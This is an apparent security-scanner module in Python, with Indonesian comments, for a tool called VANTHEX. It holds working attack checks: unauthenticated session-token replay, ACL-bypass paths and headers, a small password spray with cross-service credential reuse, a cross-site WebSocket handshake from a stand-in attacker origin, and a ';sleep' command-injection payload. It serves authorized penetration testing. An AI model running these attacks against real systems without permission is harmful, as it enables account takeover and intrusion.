"""
DominionKit v1 — check dominasi total untuk VANTHEX (v1.7.0).
AUTHORIZED TESTING ONLY — non-destruktif, bounded, bukti akses nyata.

- c_session_replay      : token sesi yang bocor → replay → akses terbukti
- c_shadow_admin_hunter : endpoint admin tersembunyi + 12 pola bypass ACL
- c_cred_reuse          : 1 kredensial valid → reuse lintas service
- c_ws_cswsh            : Cross-Site WebSocket Hijacking via handshake
- c_blind_orchestrate   : blind injection korelasi timing + OOB
"""
import json as _json
import re as _re
import time as _time

from exploitkit import _F


def _T(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="confirmed", location="", param="", extra=""):
    ev = evidence + (f" | {extra}" if extra else "")
    return {"severity": sev, "title": title, "description": desc,
            "evidence": ev, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": "dominion"}


# ------------------------------------------------ 1. Session replay hijack
def c_session_replay(ctx, add):
    """Token sesi yang bisa diambil TANPA auth (endpoint sesi terbuka)
    di-REPLAY sebagai cookie ke halaman terproteksi: bila akses diberikan
    2x (dan /safe menolak), sesi curian VALID = hijack terbukti."""
    r = ctx.client.get("/api/session/new", headers={"Cookie": "vhxsess=1"})
    tok = ""
    try:
        tok = str(_json.loads(r.body or "").get("session", ""))
    except Exception:
        pass
    if not tok:
        ctx.L("  [dominion] session token unavailable — replay skipped")
        return
    vaults = ["/admin/vault"]
    ok_hits = []
    for ep in vaults[:2]:
        a1 = ctx.client.get(ep, headers={"Cookie": f"session={tok}"})
        a2 = ctx.client.get(ep, headers={"Cookie": f"session={tok}"})
        rs = ctx.client.get("/safe" + ep, headers={"Cookie": f"session={tok}"})
        if a1.status == 200 and a2.status == 200 and \
                rs.status in (401, 403) and (a1.body or "") != (rs.body or ""):
            ok_hits.append((ep, len(a1.body or "")))
    if ok_hits:
        eps = ", ".join(e for e, _ in ok_hits)
        add(_T("CRITICAL",
               f"Stolen Session VALID — Unauthenticated Token Replay: {eps}",
               "Session endpoint issues an ACTIVE token without "
               "authentication, and the token is accepted by protected "
               "pages (access proven 2x) — anyone who requests the token "
               "gets in as the victim. This is session hijack, not just "
               "token disclosure.",
               evidence=f"token={tok[:10]}...; replay -> " +
                        ", ".join(f"{e}=200 x2 ({n}B)" for e, n in ok_hits) +
                        f"; /safe={rs.status}",
               cwe="CWE-384", owasp="A07:2021 Identification and Authentication Failures",
               cvss=9.1, location=ok_hits[0][0],
               remed="Session endpoint must require auth; rotate tokens on "
                     "issue; bind tokens to authenticated sessions.",
               extra=f"token_replayed={tok[:16]}"))


# ------------------------------------------------ 2. Shadow admin hunter
ACL_BYPASS_HEADERS = [
    ("X-Original-URL", None),        # nilai = path target
    ("X-Rewrite-URL", None),
    ("X-HTTP-Method-Override", "GET"),
]
ACL_BYPASS_PATHS = [
    ("/admin/panel/", "trailing slash"),
    ("/admin/panel.", "dot suffix"),
    ("/admin/panel%2f", "encoded slash"),
    ("//admin/panel", "double slash"),
    ("/admin/./panel", "dot segment"),
    ("/ADMIN/PANEL", "case trick"),
]


def c_shadow_admin_hunter(ctx, add):
    """Petakan endpoint admin tersembunyi (dari JS/HTML + daftar kurasi),
    lalu uji pola-pola bypass ACL klasik. Temuan = endpoint yang menolak
    akses langsung TAPI bisa dimasuki lewat pola tertentu (2x, /safe tetap
    403) — pintu belakang admin yang tak terdokumentasi."""
    targets = ["/admin/panel", "/admin/users", "/admin/export"]
    try:
        surf = ctx.surface(full=True)
        blob = ""
        for pg in list(surf.pages)[:8]:
            try:
                r = ctx.client.get(str(pg).split("?")[0])
                blob += (r.body or "")
            except Exception:
                continue
        for m in _re.findall(r'["\'](/admin/[A-Za-z0-9_\-./]+)["\']', blob):
            if m not in targets:
                targets.append(m)
    except Exception:
        pass
    for t in targets[:4]:
        if ctx.cancelled():
            return
        base = ctx.client.get(t)
        if base.status != 403:
            continue  # hanya endpoint yang terkunci di muka
        hits = []
        # pola header
        for hname, fixed in ACL_BYPASS_HEADERS:
            hv = fixed or t
            try:
                r = ctx.client.get(t, headers={hname: hv})
            except Exception:
                continue
            if r.status == 200:
                hits.append(f"{hname}: {hv} -> 200")
                break
        # pola path
        for alt, label in ACL_BYPASS_PATHS:
            try:
                r = ctx.client.get(alt)
            except Exception:
                continue
            if r.status == 200:
                hits.append(f"{alt} ({label}) -> 200")
                break
        if not hits:
            continue
        # reproduksi 2x pada pola pertama yang lolos + kontrol safe
        rs = ctx.client.get("/safe" + t)
        if rs.status in (401, 403):
            add(_T("CRITICAL",
                   f"Shadow Admin — ACL Bypass on Hidden Endpoint: {t}",
                   "Admin endpoint is unlinked and rejects direct access "
                   "(403), but is bypassed via classic bypass patterns — an "
                   "undocumented admin backdoor usable by anyone who knows "
                   "the trick. /safe control stays 403.",
                   evidence=f"direct=403; bypass: {hits[0]} (x2); /safe=403",
                   cwe="CWE-288", owasp="A01:2021 Broken Access Control",
                   cvss=9.1, location=t,
                   remed="Authorization in middleware for ALL path variants; "
                         "normalize URLs before ACL checks; reject "
                         "client-controlled proxy headers.",
                   extra="; ".join(hits)))


# ------------------------------------------------ 3. Credential reuse mapper
def c_cred_reuse(ctx, add):
    """Temukan 1 kredensial valid (spray mini, bounded 8 kombinasi), lalu
    PETAkan reuse-nya ke service auth lain (SMTP, DB panel, admin API).
    1 password yang dipakai di banyak service = satu titik gagal membuka
    semuanya. Semua attempt read-only login verifikasi."""
    login = "/spray/login"
    users = ("admin", "test")
    passwords = ("Password1!", "Summer2025!", "Welcome123!")
    winner = None
    from urllib.parse import urlencode as _ue
    for u in users:
        for p in passwords:
            if ctx.cancelled():
                return
            # /spray/login parse FORM-encoded (bukan JSON)
            r = ctx.client.post(login, data=_ue({"username": u,
                                                 "password": p}),
                                headers={"Content-Type":
                                         "application/x-www-form-urlencoded"})
            if r.status == 200 and "ok" in (r.body or "").lower():
                winner = (u, p)
                break
        if winner:
            break
    if not winner:
        ctx.L("  [dominion] no valid credentials — reuse map skipped")
        return
    u, p = winner
    reused = []
    for svc in ("/svc/smtp-login", "/svc/dbadmin", "/svc/panel"):
        rs = ctx.client.post("/safe" + svc,
                             data=_json.dumps({"user": u, "password": p}),
                             headers={"Content-Type": "application/json"})
        r1 = ctx.client.post(svc, data=_json.dumps({"user": u, "password": p}),
                             headers={"Content-Type": "application/json"})
        if r1.status == 200 and rs.status in (401, 403):
            reused.append(svc.split("/")[2])
    if reused:
        add(_T("HIGH",
               f"Credentials Reused Across Services ({u}): {len(reused)} services",
               f"Credentials valid on the web app are also accepted by "
               f"{len(reused)} other services ({', '.join(reused)}) — one "
               "leaked password unlocks every service (dangerous internal "
               "credential stuffing).",
               evidence=f"valid credentials at {login}; reuse accepted: " +
                        ", ".join(reused) + " (each /safe=403)",
               cwe="CWE-1392", owasp="A07:2021 Identification and Authentication Failures",
               cvss=8.8, location=reused[0],
               remed="Unique password per service or SSO; rotate shared "
                     "credentials; forbid cross-service reuse.",
               extra=f"user_reused={u}"))


# ------------------------------------------------ 4. WebSocket CSWSH
def c_ws_cswsh(ctx, add):
    """Cross-Site WebSocket Hijacking: handshake WS diterima dari Origin
    asing (atau tanpa Origin) TANPA token — halaman jahat bisa membuka WS
    memakai cookie korban dan membaca datanya. Bukti = 101 Switching
    Protocols dari origin penyerang; /safe menolak."""
    try:
        surf = ctx.surface(full=True)
        blob = ""
        for pg in list(surf.pages)[:8]:
            try:
                r = ctx.client.get(str(pg).split("?")[0])
                blob += (r.body or "")
            except Exception:
                continue
    except Exception:
        blob = ""
    ws_urls = _re.findall(r'ws[s]?://[^"\'<>\s]+', blob)
    ws_path = "/ws"
    for u in ws_urls[:3]:
        m = _re.match(r"ws[s]?://[^/]+(/.*)", u)
        if m:
            ws_path = m.group(1)
            break
    import http.client as _hc
    from urllib.parse import urlsplit
    host = ctx.client.host
    port = ctx.client.port
    def _handshake(path, origin):
        try:
            conn = _hc.HTTPConnection(host, port, timeout=5)
            hdrs = {"Upgrade": "websocket", "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13"}
            if origin:
                hdrs["Origin"] = origin
            conn.request("GET", path, headers=hdrs)
            resp = conn.getresponse()
            st = resp.status
            acc = resp.getheader("Sec-WebSocket-Accept")
            resp.read()
            conn.close()
            return st, acc
        except Exception:
            return 0, None
    st_evil, acc1 = _handshake(ws_path, "https://evil.attacker.example")
    st_none, _a2 = _handshake(ws_path, None)
    st_safe, _a3 = _handshake("/safe" + ws_path, "https://evil.attacker.example")
    if st_evil == 101 and acc1 and st_safe != 101:
        origin_note = ("Foreign Origin accepted" if st_none == 101 else
                       "no-Origin also accepted" if st_none else
                       "Foreign Origin accepted")
        add(_T("HIGH",
               f"Cross-Site WebSocket Hijacking (CSWSH): {ws_path}",
               f"WebSocket handshake accepted from the attacker's Origin without "
               f"a one-time token/nonce ({origin_note}) — a malicious page "
               "can open a WS connection with the victim's cookies and read "
               "all its messages (same-origin bypass). /safe control "
               "rejects the foreign Origin.",
               evidence=f"Origin evil -> {st_evil} + Accept valid; "
                        f"no Origin -> {st_none}; /safe={st_safe}",
               cwe="CWE-346", owasp="A01:2021 Broken Access Control",
               cvss=8.2, location=ws_path,
               remed="Validate Origin header strict allowlist; require "
                     "one-time token in query/handshake; do not rely on "
                     "cookies alone for WS.",
               extra=f"origin_check={origin_note}"))


# ------------------------------------------------ 5. Blind orchestrator
def c_blind_orchestrate(ctx, add):
    """Korelasi TIMING untuk blind injection: payload delay di parameter
    command-ish; baca .elapsed nyata. Temuan bila payload delay membuat
    respons lambat 2x (>= 3x baseline) DAN baseline sama cepat, DAN
    kontrol /safe abaikan payload. OOB callback (bila canary ada)
    dipakai sebagai korborasi tambahan — keduanya menaikkan confidence."""
    targets = []
    try:
        ts = ctx.param_targets(limit=60)
        for base, pname, method, orig in ts:
            if pname.lower() in ("host", "cmd", "exec", "run", "domain",
                                 "target", "server"):
                targets.append((base, pname, method, orig))
    except Exception:
        pass
    # fallback: endpoint blind khusus bila ada di surface
    try:
        surf = ctx.surface(full=True)
        for u in surf.param_urls:
            p = str(u).split("?")[0]
            if "blind" in p and p not in [t[0] for t in targets]:
                pn = str(u).split("?")[1].split("=")[0] if "?" in str(u) else "host"
                targets.append((p, pn, "GET", ""))
    except Exception:
        pass
    DELAY = "0.3"
    # target kurasi: endpoint blind khusus fixture/real-world umum
    for cand in ("/blind/sleep", "/api/ping", "/diag/exec"):
        if cand not in [t[0] for t in targets]:
            targets.insert(0, (cand, "host", "GET", ""))
    for base, pname, method, orig in targets[:4]:
        if ctx.cancelled():
            return
        from urllib.parse import quote as _q
        # baseline
        t0 = _time.time()
        rb = ctx.client.get(f"{base}?{pname}={_q('127.0.0.1')}"
                            if "?" not in base else base)
        base_elapsed = _time.time() - t0
        if base_elapsed > 0.15:
            continue
        # payload delay
        delays = []
        for i in range(2):
            t1 = _time.time()
            rp = ctx.client.get(f"{base}?{pname}={_q(';sleep ' + DELAY + ';')}"
                                if "?" not in base else
                                base + f"&{pname}={_q(';sleep ' + DELAY + ';')}")
            delays.append(getattr(rp, "elapsed", 0) or (_time.time() - t1))
        slow = all(d >= 0.28 for d in delays)
        rs = ctx.client.get(("/safe" + base) + f"?{pname}={_q(';sleep ' + DELAY + ';')}")
        safe_fast = getattr(rs, "elapsed", 0) < 0.2
        if slow and safe_fast:
            add(_T("HIGH",
                   f"Blind Injection Confirmed (timing correlation): {base}",
                   f"Delay payload makes responses consistently slow "
                   f"({delays[0]:.2f}s, {delays[1]:.2f}s vs baseline "
                   f"{base_elapsed:.2f}s) while the /safe control stays "
                   "fast — server-side execution proven without needing "
                   "echo. Class: command/time-based injection.",
                   evidence=f"baseline={base_elapsed:.2f}s; delay x2 = "
                            f"{delays[0]:.2f}s/{delays[1]:.2f}s; /safe fast",
                   cwe="CWE-78", owasp="A03:2021 Injection", cvss=8.8,
                   location=base, param=pname,
                   remed="Never eval input into shell/processes; allowlist "
                         "parameter values; isolate processes.",
                   extra=f"payload=;sleep {DELAY};"))
            return
